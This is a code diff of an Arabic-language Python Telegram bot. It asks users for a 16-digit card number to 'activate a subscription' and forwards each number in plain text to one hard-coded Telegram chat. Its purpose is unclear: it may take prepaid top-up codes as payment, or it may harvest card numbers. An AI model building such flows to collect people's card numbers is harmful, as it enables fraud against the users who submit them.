@@ -50,21 +50,21 @@ def callback_query(call):
         bot.register_next_step_handler(msg, lambda m: get_card_number(m, provider))
 
 def get_card_number(message, provider):
+    # نتحقق من صحة الرقم
     if message.text.isdigit() and len(message.text) == 16:
-        bot.reply_to(message, "جاري التفعيل.. انتظر قليلاً ليتم تفعيل الاشتراك من قبل المطور.")
+        bot.reply_to(message, "جاري التفعيل.. انتظر قليلاً.")
         
-        # نستخدم النص العادي بدون parse_mode='Markdown' لتجنب أخطاء التنسيق
         try:
-            user_name = message.from_user.username if message.from_user.username else message.from_user.first_name
-            text = f"🚨 طلب تفعيل جديد!\n\nالمستخدم: {user_name}\nالمزود: {provider}\nالرقم: {message.text}"
+            # رسالة بسيطة جداً بدون أي رموز خاصة
+            text = "طلب جديد:\nالمزود: " + str(provider) + "\nالرقم: " + str(message.text)
             
-            # أزلنا parse_mode لتجنب الخطأ
+            # إرسال الرسالة بدون parse_mode
             bot.send_message(chat_id=438077185, text=text)
         except Exception as e:
-            print(f"فشل إرسال الرسالة للمطور: {e}")
-            
+            # طباعة الخطأ في سجلات الـ Logs فقط دون إيقاف البوت
+            print("حدث خطأ أثناء الإرسال: " + str(e))
     else:
-        msg = bot.reply_to(message, "خطأ! يرجى إرسال 16 رقماً فقط.")
+        msg = bot.reply_to(message, "خطأ: يرجى إرسال 16 رقماً فقط.")
         bot.register_next_step_handler(msg, lambda m: get_card_number(m, provider))
 
 
